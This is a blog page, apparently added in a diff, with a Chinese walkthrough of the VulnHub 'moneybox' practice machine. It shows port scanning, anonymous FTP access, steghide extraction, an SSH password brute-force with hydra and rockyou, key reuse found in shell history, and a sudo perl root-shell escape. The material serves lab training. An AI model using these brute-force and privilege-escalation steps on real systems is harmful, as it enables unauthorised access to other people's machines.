@@ -1,0 +1,295 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>VulnHub靶机-moneybox | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="VulnHub靶机-moneybox | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+Day1
+立个flag  三月结束前打完苑老师课程的靶机
+靶机地址: https://www.vulnhub.com/entry/moneybox-1,653/
+需要在靶机上面操作一下才可扫到主机
+https://blog.csdn...." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              VulnHub靶机-moneybox
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-02-24
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>Day1</p>
+<p>立个flag  <strong>三月结束前</strong>打完苑老师课程的靶机</p>
+<p>靶机地址: https://www.vulnhub.com/entry/moneybox-1,653/</p>
+<p>需要在靶机上面操作一下才可扫到主机</p>
+<p>https://blog.csdn.net/m0_70272734/article/details/134129917</p>
+<p>难度:简单</p>
+<p>内容 :</p>
+<ul>
+<li>ssh写公钥 不需要密码直接登录</li>
+<li>图片隐写</li>
+<li>ssh破解</li>
+<li>perl 提权</li>
+</ul>
+<h1 id="信息收集">信息收集</h1>
+<p><code>sudo nmap -sn 192.168.1.0/24</code></p>
+<p>发现目标ip  192.168.1.5</p>
+<p><code>sudo nmap --min-rate 10000 -p- 192.168.1.5</code>  对全端口扫描</p>
+<p>发现</p>
+<p>21/tcp open  ftp<br>
+22/tcp open  ssh<br>
+80/tcp open  http</p>
+<p><code>sudo nmap -sT -sV -O -p21,22,80 192.168.1.5</code>  对扫出来的端口  扫详细信息</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241418870.png" alt="image-20240224141853816" loading="lazy"></figure>
+<h1 id="外网打点">外网打点</h1>
+<h2 id="80端口">80端口</h2>
+<p>页面没啥 然后用dirsearch 扫目录</p>
+<p>发现 http://192.168.1.5/blogs/   然后翻页面源代码看到了 Secret Key 3xtr4ctd4t4</p>
+<p>不知道有啥用了</p>
+<p>下面就剩下 21  22了</p>
+<h2 id="21端口">21端口</h2>
+<p><code>sudo nmap -p21 -sC 192.168.1.5</code>   发现可以匿名登录  Anonymous FTP login allowed</p>
+<p>fscan 也可以扫描出来</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241433933.png" alt="image-20240224143341894" loading="lazy"></figure>
+<p>可以用 ftp 192.168.1.5   连接  账号anonymous</p>
+<p>可以看到上面有一张照片   下到本地  get trytofind.jpg</p>
+<p>观察图片啥也没发现    想到可能是 图片隐写</p>
+<p>先用string  trytofind.jpg 看看有什么字符</p>
+<p>这样子是很奇怪的 正常的图片不会是这样 很多括号 一堆字母在一起</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241448878.png" alt="image-20240224144842835" loading="lazy"></figure>
+<p>用kali中的  steghide工具    这是提示我们要输入密码   前面在80端口获得了一个 Secret Key   3xtr4ctd4t4</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241455026.png" alt="image-20240224145542993" loading="lazy"></figure>
+<p>确实存在东西   再用steghide里面的extract 提取出data</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241500856.png" alt="image-20240224150028832" loading="lazy"></figure>
+<p><code>steghide --extract  -sf trytofind.jpg</code></p>
+<p>提示了一个账号  还有密码相关的  就想到了22端口 用renu 账号去爆破可能性应该很大</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241503127.png" alt="image-20240224150348104" loading="lazy"></figure>
+<h2 id="22">22</h2>
+<p>可以去暴力破解 但是 是不得以的情况</p>
+<p>这里可以用 hydra工具</p>
+<p>https://blog.csdn.net/weixin_44802617/article/details/126842861  需要解压字典</p>
+<p>https://zhuanlan.zhihu.com/p/397779150</p>
+<p><code>hydta -l renu -P rockyou.txt 192.168.1.5 ssh  </code></p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241522400.png" alt="image-20240224152223364" loading="lazy"></figure>
+<p>成功登录到 renu账号</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241524541.png" alt="image-20240224152422504" loading="lazy"></figure>
+<p>发现flag1</p>
+<h1 id="提权">提权</h1>
+<p>试着su root 要密码</p>
+<p>看看有没有suid   <code>find / -perm -u=s -type f 2&gt;/dev/null</code>   没得好利用的</p>
+<p>sudo -l 看不了</p>
+<p>uname -a 看内核</p>
+<p>看一看他的历史命令(靶机嘛)   history</p>
+<pre><code>	cd lily
+   22  ssh-keygen -t rsa           //生成 ssh的密钥 
+   23  clear
+   24  cd .ssh
+   25  ls
+   26  ssh-copy-id lily@192.168.43.80    //把自己生成的ssh密钥拷贝到了lily用户下  这样renu账号就可以不使用密码 使用公钥认证的方法登入到lily 
+   31  chmod 400 id_rsa
+   32  ls -l
+   33  ssh -i id_rsa lily@192.168.43.80
+   35  ssh -i id_rsa lily@192.168.43.80
+   38  cd .ssh/
+   39  ls
+   40  ssh -i id_rsa lily@192.168.43.80
+   41  su lily
+</code></pre>
+<p>发现有个lily用户</p>
+<p>cd  lily 得到 flag2</p>
+<p><strong>注意</strong>  这里虽然cd到了lily 但是你的终端依旧是 renu账号的    要通过ssh或者su才能够切换账号(终端 权限发生变化 )</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241554726.png" alt="image-20240224155409701" loading="lazy"></figure>
+<p>根据history去查看 他们的.ssh文件夹  果然 renu账号给了lily一个公钥 这样 renu账号直接可以 用ssh连接lily账号而不需要密码</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241552387.png" alt="image-20240224155228221" loading="lazy"></figure>
+<p>ssh lily@127.0.0.1</p>
+<p>成功切换</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241600075.png" alt="image-20240224160025030" loading="lazy"></figure>
+<p>发现 perl 有sudo权限</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241601091.png" alt="image-20240224160106059" loading="lazy"></figure>
+<p>https://gtfobins.github.io/gtfobins/perl/ 查找命令</p>
+<p><code>sudo perl -e 'exec &quot;/bin/sh&quot;;'</code></p>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241602321.png" alt="image-20240224160255299" loading="lazy"></figure>
+<p>ls -all 看隐藏的文件</p>
+<p>获得最总flag</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202402241605505.png" alt="image-20240224160508455" loading="lazy"></figure>
+<h1 id="总结">总结</h1>
+<p>回头来看确实算是简单的靶机 ，对ssh连接了解过，然后知道怎么看图片隐藏的内容  这应该是misc的知识   还有个 ftp</p>
+<h2 id="ftp">ftp</h2>
+<p>文件传输协议</p>
+<p>FTP允许用户以文件操作的方式（如文件的增、删、改、查、传送等）与另一主机相互通信。然而， 用户并不真正登录到自己想要存取的计算机上面而成为完全用户， 可用FTP程序访问远程资源， 实现用户往返传输文件、目录管理以及访问电子邮件等等， 即使双方计算机可能配有不同的操作系统和文件存储方式</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9">外网打点</a>
+<ul>
+<li><a href="#80%E7%AB%AF%E5%8F%A3">80端口</a></li>
+<li><a href="#21%E7%AB%AF%E5%8F%A3">21端口</a></li>
+<li><a href="#22">22</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a>
+<ul>
+<li><a href="#ftp">ftp</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/zui-jian-dan-de-dai-li-ji-zhu/">
+              <h3 class="post-title">
+                最简单的代理技术
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
